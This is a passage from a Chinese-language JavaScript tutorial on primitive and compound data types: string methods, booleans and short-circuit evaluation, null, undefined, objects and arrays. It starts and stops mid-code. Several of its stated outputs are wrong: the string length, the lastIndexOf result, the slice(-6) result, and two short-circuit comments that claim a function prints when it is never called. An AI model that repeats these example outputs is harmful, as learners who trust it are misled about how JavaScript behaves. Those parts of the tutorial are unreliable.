class="line"></span><br><span class="line"><span class="comment">// 字符串方法</span></span><br><span class="line"><span class="keyword">var</span> str = <span class="string">&quot;Hello, JavaScript!&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(str.<span class="property">length</span>); <span class="comment">// 17</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(str.<span class="title function_">charAt</span>(<span class="number">0</span>)); <span class="comment">// &quot;H&quot;</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(str.<span class="title function_">charCodeAt</span>(<span class="number">0</span>)); <span class="comment">// 72（Unicode编码）</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(str.<span class="title function_">concat</span>(<span class="string">&quot;, World!&quot;</span>)); <span class="comment">// &quot;Hello, JavaScript!, World!&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(str.<span class="title function_">indexOf</span>(<span class="string">&quot;Java&quot;</span>)); <span class="comment">// 7</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(str.<span class="title function_">lastIndexOf</span>(<span class="string">&quot;a&quot;</span>)); <span class="comment">// 14</span></span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(str.<span class="title function_">substring</span>(<span class="number">7</span>, <span class="number">13</span>)); <span class="comment">// &quot;JavaSc&quot;</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(str.<span class="title function_">slice</span>(<span class="number">7</span>, <span class="number">13</span>)); <span class="comment">// &quot;JavaSc&quot;</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(str.<span class="title function_">slice</span>(-<span class="number">6</span>)); <span class="comment">// &quot;ript!&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(str.<span class="title function_">toLowerCase</span>()); <span class="comment">// &quot;hello, javascript!&quot;</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(str.<span class="title function_">toUpperCase</span>()); <span class="comment">// &quot;HELLO, JAVASCRIPT!&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(str.<span class="title function_">trim</span>()); <span class="comment">// 移除两端空白</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;  Hello  &quot;</span>.<span class="title function_">trimLeft</span>()); <span class="comment">// &quot;Hello  &quot;</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;  Hello  &quot;</span>.<span class="title function_">trimRight</span>()); <span class="comment">// &quot;  Hello&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(str.<span class="title function_">split</span>(<span class="string">&quot; &quot;</span>)); <span class="comment">// [&quot;Hello,&quot;, &quot;JavaScript!&quot;]</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 正则表达式相关方法</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(str.<span class="title function_">search</span>(<span class="regexp">/Java/</span>)); <span class="comment">// 7</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(str.<span class="title function_">match</span>(<span class="regexp">/[a-z]+/g</span>)); <span class="comment">// [&quot;ello&quot;, &quot;ava&quot;, &quot;cript&quot;]</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(str.<span class="title function_">replace</span>(<span class="regexp">/JavaScript/</span>, <span class="string">&quot;World&quot;</span>)); <span class="comment">// &quot;Hello, World!&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 包含检查（ES6+）</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(str.<span class="title function_">includes</span>(<span class="string">&quot;Java&quot;</span>)); <span class="comment">// true</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(str.<span class="title function_">startsWith</span>(<span class="string">&quot;Hello&quot;</span>)); <span class="comment">// true</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(str.<span class="title function_">endsWith</span>(<span class="string">&quot;!&quot;</span>)); <span class="comment">// true</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 重复字符串（ES6+）</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;x&quot;</span>.<span class="title function_">repeat</span>(<span class="number">3</span>)); <span class="comment">// &quot;xxx&quot;</span></span><br></pre></td></tr></table></figure>

<h4 id="8-1-3-布尔型（Boolean）"><a href="#8-1-3-布尔型（Boolean）" class="headerlink" title="8.1.3 布尔型（Boolean）"></a>8.1.3 布尔型（Boolean）</h4><p><strong>详细解释：</strong></p>
<ul>
<li>只有两个值：<code>true</code>和<code>false</code></li>
<li>用于条件判断和逻辑运算</li>
<li>在条件语句中，其他类型会隐式转换为布尔值</li>
</ul>
<p><strong>示例：</strong></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 布尔值</span></span><br><span class="line"><span class="keyword">var</span> isTrue = <span class="literal">true</span>;</span><br><span class="line"><span class="keyword">var</span> isFalse = <span class="literal">false</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="keyword">typeof</span> isTrue); <span class="comment">// &quot;boolean&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 比较运算</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="number">5</span> &gt; <span class="number">3</span>); <span class="comment">// true</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="number">5</span> &lt; <span class="number">3</span>); <span class="comment">// false</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="number">5</span> == <span class="number">5</span>); <span class="comment">// true</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="number">5</span> != <span class="number">3</span>); <span class="comment">// true</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 严格相等（值和类型都相等）</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="number">5</span> === <span class="number">5</span>); <span class="comment">// true</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="number">5</span> === <span class="string">&quot;5&quot;</span>); <span class="comment">// false</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="number">5</span> !== <span class="string">&quot;5&quot;</span>); <span class="comment">// true</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 逻辑运算</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="literal">true</span> &amp;&amp; <span class="literal">true</span>); <span class="comment">// true</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="literal">true</span> &amp;&amp; <span class="literal">false</span>); <span class="comment">// false</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="literal">true</span> || <span class="literal">false</span>); <span class="comment">// true</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="literal">false</span> || <span class="literal">false</span>); <span class="comment">// false</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(!<span class="literal">true</span>); <span class="comment">// false</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 短路求值</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">logMessage</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;函数被调用&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 第二个表达式不会执行</span></span><br><span class="line"><span class="literal">true</span> || <span class="title function_">logMessage</span>(); <span class="comment">// 只输出&quot;函数被调用&quot;</span></span><br><span class="line"><span class="literal">false</span> &amp;&amp; <span class="title function_">logMessage</span>(); <span class="comment">// 只输出&quot;函数被调用&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 隐式类型转换</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Boolean</span>(<span class="number">0</span>)); <span class="comment">// false</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Boolean</span>(<span class="number">1</span>)); <span class="comment">// true</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Boolean</span>(<span class="string">&quot;&quot;</span>)); <span class="comment">// false</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Boolean</span>(<span class="string">&quot;Hello&quot;</span>)); <span class="comment">// true</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Boolean</span>(<span class="literal">null</span>)); <span class="comment">// false</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Boolean</span>(<span class="literal">undefined</span>)); <span class="comment">// false</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Boolean</span>(&#123;&#125;)); <span class="comment">// true</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Boolean</span>([])); <span class="comment">// true</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 在条件语句中的应用</span></span><br><span class="line"><span class="keyword">var</span> value = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span> (value) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;value为真&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;value为假&quot;</span>); <span class="comment">// 输出</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 三元运算符</span></span><br><span class="line"><span class="keyword">var</span> result = (<span class="number">5</span> &gt; <span class="number">3</span>) ? <span class="string">&quot;大于&quot;</span> : <span class="string">&quot;小于&quot;</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(result); <span class="comment">// &quot;大于&quot;</span></span><br></pre></td></tr></table></figure>

<h4 id="8-1-4-null（空值）"><a href="#8-1-4-null（空值）" class="headerlink" title="8.1.4 null（空值）"></a>8.1.4 null（空值）</h4><p><strong>详细解释：</strong></p>
<ul>
<li>表示”无”或”空”的特殊值</li>
<li>通常用于表示对象引用为空</li>
<li><code>typeof null</code>返回<code>&quot;object&quot;</code>（历史遗留问题）</li>
</ul>
<p><strong>示例：</strong></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// null的使用</span></span><br><span class="line"><span class="keyword">var</span> empty = <span class="literal">null</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(empty); <span class="comment">// null</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="keyword">typeof</span> empty); <span class="comment">// &quot;object&quot;（历史遗留问题）</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 表示对象引用为空</span></span><br><span class="line"><span class="keyword">var</span> user = &#123;</span><br><span class="line">    <span class="attr">name</span>: <span class="string">&quot;张三&quot;</span>,</span><br><span class="line">    <span class="attr">address</span>: <span class="literal">null</span> <span class="comment">// 表示地址信息为空</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 检查null</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(empty === <span class="literal">null</span>); <span class="comment">// true</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(empty == <span class="literal">null</span>); <span class="comment">// true</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// null与undefined的区别</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="literal">null</span> == <span class="literal">undefined</span>); <span class="comment">// true（宽松相等）</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="literal">null</span> === <span class="literal">undefined</span>); <span class="comment">// false（严格相等）</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用场景</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">findUser</span>(<span class="params">id</span>) &#123;</span><br><span class="line">    <span class="comment">// 模拟查找用户</span></span><br><span class="line">    <span class="keyword">if</span> (id === <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> &#123; <span class="attr">id</span>: <span class="number">1</span>, <span class="attr">name</span>: <span class="string">&quot;张三&quot;</span> &#125;;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>; <span class="comment">// 表示未找到用户</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> user1 = <span class="title function_">findUser</span>(<span class="number">1</span>);</span><br><span class="line"><span class="keyword">var</span> user2 = <span class="title function_">findUser</span>(<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(user1); <span class="comment">// &#123; id: 1, name: &quot;张三&quot; &#125;</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(user2); <span class="comment">// null</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (user2 === <span class="literal">null</span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;用户未找到&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="8-1-5-undefined（未定义）"><a href="#8-1-5-undefined（未定义）" class="headerlink" title="8.1.5 undefined（未定义）"></a>8.1.5 undefined（未定义）</h4><p><strong>详细解释：</strong></p>
<ul>
<li>表示变量已声明但未赋值</li>
<li>函数没有返回值时的默认返回值</li>
<li>未定义的属性或方法</li>
<li><code>typeof undefined</code>返回<code>&quot;undefined&quot;</code></li>
</ul>
<p><strong>示例：</strong></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 未初始化的变量</span></span><br><span class="line"><span class="keyword">var</span> uninitialized;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(uninitialized); <span class="comment">// undefined</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="keyword">typeof</span> uninitialized); <span class="comment">// &quot;undefined&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 函数没有返回值</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">noReturn</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="comment">// 没有return语句</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> result = <span class="title function_">noReturn</span>();</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(result); <span class="comment">// undefined</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 未定义的属性</span></span><br><span class="line"><span class="keyword">var</span> obj = &#123;&#125;;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(obj.<span class="property">property</span>); <span class="comment">// undefined</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 检查undefined</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="keyword">typeof</span> uninitialized === <span class="string">&quot;undefined&quot;</span>); <span class="comment">// true</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(uninitialized === <span class="literal">undefined</span>); <span class="comment">// true</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(uninitialized == <span class="literal">undefined</span>); <span class="comment">// true</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 与null的区别</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="literal">null</span> == <span class="literal">undefined</span>); <span class="comment">// true</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="literal">null</span> === <span class="literal">undefined</span>); <span class="comment">// false</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用场景</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">getUser</span>(<span class="params">id</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (id === <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> &#123; <span class="attr">id</span>: <span class="number">1</span>, <span class="attr">name</span>: <span class="string">&quot;张三&quot;</span> &#125;;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 没有return，返回undefined</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> user1 = <span class="title function_">getUser</span>(<span class="number">1</span>);</span><br><span class="line"><span class="keyword">var</span> user2 = <span class="title function_">getUser</span>(<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(user1); <span class="comment">// &#123; id: 1, name: &quot;张三&quot; &#125;</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(user2); <span class="comment">// undefined</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (user2 === <span class="literal">undefined</span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;用户未找到&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 作为函数参数的默认值</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">greet</span>(<span class="params">name = <span class="string">&quot;访客&quot;</span></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;你好，&quot;</span> + name + <span class="string">&quot;！&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">greet</span>(); <span class="comment">// &quot;你好，访客！&quot;</span></span><br><span class="line"><span class="title function_">greet</span>(<span class="string">&quot;张三&quot;</span>); <span class="comment">// &quot;你好，张三！&quot;</span></span><br></pre></td></tr></table></figure>

<h3 id="8-2-复合数据类型"><a href="#8-2-复合数据类型" class="headerlink" title="8.2 复合数据类型"></a>8.2 复合数据类型</h3><h4 id="8-2-1-对象（Object）"><a href="#8-2-1-对象（Object）" class="headerlink" title="8.2.1 对象（Object）"></a>8.2.1 对象（Object）</h4><p><strong>详细解释：</strong></p>
<ul>
<li>用于存储键值对的集合</li>
<li>无序的数据结构</li>
<li>通过属性和方法组织数据</li>
<li>所有非基本类型都是对象（包括数组、函数等）</li>
</ul>
<p><strong>示例：</strong></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 创建对象的多种方式</span></span><br><span class="line"><span class="keyword">var</span> obj1 = &#123;&#125;; <span class="comment">// 对象字面量</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> obj2 = &#123;</span><br><span class="line">    <span class="attr">name</span>: <span class="string">&quot;张三&quot;</span>,</span><br><span class="line">    <span class="attr">age</span>: <span class="number">25</span>,</span><br><span class="line">    <span class="attr">sayHello</span>: <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;你好，&quot;</span> + <span class="variable language_">this</span>.<span class="property">name</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> obj3 = <span class="keyword">new</span> <span class="title class_">Object</span>();</span><br><span class="line">obj3.<span class="property">name</span> = <span class="string">&quot;李四&quot;</span>;</span><br><span class="line">obj3.<span class="property">age</span> = <span class="number">30</span>;</span><br><span class="line">obj3.<span class="property">sayHello</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;你好，&quot;</span> + <span class="variable language_">this</span>.<span class="property">name</span>);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 访问属性</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(obj2.<span class="property">name</span>); <span class="comment">// &quot;张三&quot;</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(obj2[<span class="string">&quot;age&quot;</span>]); <span class="comment">// 25</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 修改属性</span></span><br><span class="line">obj2.<span class="property">age</span> = <span class="number">26</span>;</span><br><span class="line">obj2[<span class="string">&quot;name&quot;</span>] = <span class="string">&quot;王五&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 添加新属性</span></span><br><span class="line">obj2.<span class="property">gender</span> = <span class="string">&quot;男&quot;</span>;</span><br><span class="line">obj2[<span class="string">&quot;city&quot;</span>] = <span class="string">&quot;北京&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 删除属性</span></span><br><span class="line"><span class="keyword">delete</span> obj2.<span class="property">city</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 对象方法</span></span><br><span class="line">obj2.<span class="title function_">sayHello</span>(); <span class="comment">// &quot;你好，王五！&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 检查属性是否存在</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;name&quot;</span> <span class="keyword">in</span> obj2); <span class="comment">// true</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(obj2.<span class="title function_">hasOwnProperty</span>(<span class="string">&quot;age&quot;</span>)); <span class="comment">// true</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 遍历对象属性</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> key <span class="keyword">in</span> obj2) &#123;</span><br><span class="line">    <span class="keyword">if</span> (obj2.<span class="title function_">hasOwnProperty</span>(key)) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(key + <span class="string">&quot;: &quot;</span> + obj2[key]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 对象方法</span></span><br><span class="line"><span class="keyword">var</span> person = &#123;</span><br><span class="line">    <span class="attr">firstName</span>: <span class="string">&quot;张&quot;</span>,</span><br><span class="line">    <span class="attr">lastName</span>: <span class="string">&quot;三&quot;</span>,</span><br><span class="line">    <span class="attr">getFullName</span>: <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">firstName</span> + <span class="variable language_">this</span>.<span class="property">lastName</span>;</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">setFullName</span>: <span class="keyword">function</span>(<span class="params">fullName</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> names = fullName.<span class="title function_">split</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">firstName</span> = names[<span class="number">0</span>];</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">lastName</span> = names.<span class="title function_">slice</span>(<span class="number">1</span>).<span class="title function_">join</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(person.<span class="title function_">getFullName</span>()); <span class="comment">// &quot;张三&quot;</span></span><br><span class="line">person.<span class="title function_">setFullName</span>(<span class="string">&quot;李四&quot;</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(person.<span class="title function_">getFullName</span>()); <span class="comment">// &quot;李四&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 对象拷贝</span></span><br><span class="line"><span class="keyword">var</span> original = &#123; <span class="attr">a</span>: <span class="number">1</span>, <span class="attr">b</span>: <span class="number">2</span> &#125;;</span><br><span class="line"><span class="keyword">var</span> shallowCopy = <span class="title class_">Object</span>.<span class="title function_">assign</span>(&#123;&#125;, original);</span><br><span class="line"><span class="keyword">var</span> deepCopy = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(original));</span><br></pre></td></tr></table></figure>

<h4 id="8-2-2-数组（Array）"><a href="#8-2-2-数组（Array）" class="headerlink" title="8.2.2 数组（Array）"></a>8.2.2 数组（Array）</h4><p><strong>详细解释：</strong></p>
<ul>
<li>用于存储有序的元素集合</li>
<li>元素可以是任意数据类型</li>
<li>通过索引访问元素（从0开始）</li>
<li>动态大小，可以随时添加或删除元素</li>
</ul>
<p><strong>示例：</strong></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 创建数组的多种方式</span></span><br><span class="line"><span class="keyword">var</span> arr1 = []; <span class="comment">// 空数组</span></span><br><span class="line"><span class="keyword">var</span> arr2 = [<span class="number">1</span>, <span class="string">&quot;Hello&quot;</span>, <span class="literal">true</span>, &#123; <span class="attr">name</span>: <span class="string">&quot;张三&quot;</span> &#125;, [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]];</span><br><span class="line"><span class="keyword">var</span> arr3 = <span class="keyword">new</span> <span class="title class_">Array</span>(); <span class="comment">// 空数组</span></span><br><span class="line"><span class="keyword">var</span> arr4 = <span class="keyword">new</span> <span class="title class_">Array</span>(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>); <span class="comment">// [1, 2, 3]</span></span><br><span class="line"><span class="keyword">var</span> arr5 = <span class="keyword">new</span> <span class="title class_">Array</span>(<span class="number">5</span>); <span class="comment">// 长度为5的空数组</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 访问元素</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(arr2[<span class="number">0</span>]); <span class="comment">// 1</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(arr2[<span class="number">1</span>]); <span class="comment">// &quot;Hello&quot;</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(arr2[arr2.<span class="property">length</span> - <span class="number">1</span>]); <span class="comment">// [1, 2, 3]</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 修改元素</span></span><br><span class="line">arr2[<span class="number">0</span>] = <span class="number">10</span>;</span><br><span class="line">arr2[<span class="number">4</span>][<span class="number">0</span>] = <span class="number">100</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 添加元素</span></span><br><span class="line">arr2.<span class="title function_">push</span>(<span class="string">&quot;新元素&quot;</span>); <span class="comment">// 末尾添加</span></span><br><span class="line">arr2.<span class="title function_">unshift</span>(<span class="string">&quot;开头元素&quot;</span>); <span class="comment">// 开头添加</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 删除元素</span></span><br><span class="line"><span class="keyword">var</span> last = arr2.<span class="title function_">pop</span>(); <span class="comment">// 删除末尾元素</span></span><br><span class="line"><span class="keyword">var</span> first = arr2.<span class="title function_">shift</span>(); <span class="comment">// 删除开头元素</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 查找元素</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(arr2.<span class="title function_">indexOf</span>(<span class="string">&quot;Hello&quot;</span>)); <span class="comment">// 1</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(arr2.<span class="title function_">includes</span>(<span class="string">&quot;Hello&quot;</span>)); <span class="comment">// true</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 遍历数组</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; arr2.<span class="property">length</span>; i++) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(arr2[i]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">arr2.<span class="title function_">forEach</span>(<span class="keyword">function</span>(<span class="params">item, index</span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(index + <span class="string">&quot;: &quot;</span> + item);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 数组方法</span></span><br><span class="line"><span class="keyword">var</span> numbers = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>];</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(numbers.<span class="property">length</span>); <span class="comment">// 5</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 添加/删除元素</span></span><br><span class="line">numbers.<span class="title function_">push</span>(<span class="number">6</span>); <span class="comment">// [1,2,3,4,5,6]</span></span><br><span class="line">numbers.<span class="title function_">pop</span>(); <span class="comment">// [1,2,3,4,5]</span></span><br><span class="line">numbers.<span class="title function_">unshift</span>(<span class="number">0</span>); <span class="comment">// [0,1,2,3,4,5]</span></span><br><span class="line">numbers.<span class="title function_">shift</span>(); <span class="comment">// [1,2,3,4,5]</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 插入/替换/删除元素</span></span><br><span class="line">numbers.<span class="title function_">splice</span>(<span class="number">2</span>, <span class="number">0</span>, <span class="number">2.5</span>); <span class="comment">// 在索引2处插入2.5</span></span><br><span class="line">numbers.<span class="title function_">splice</span>(<span class="number">2</span>, <span class="number">1</span>, <span class="number">2.6</span>); <span class="comment">// 替换索引2处的元素</span></span><br><span class="line">numbers.<span class="title function_">splice</span>(<span class="number">2</span>, <span class="number">1</span>); <span class="comment">// 删除索引2处的元素</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 切片</span></span><br><span 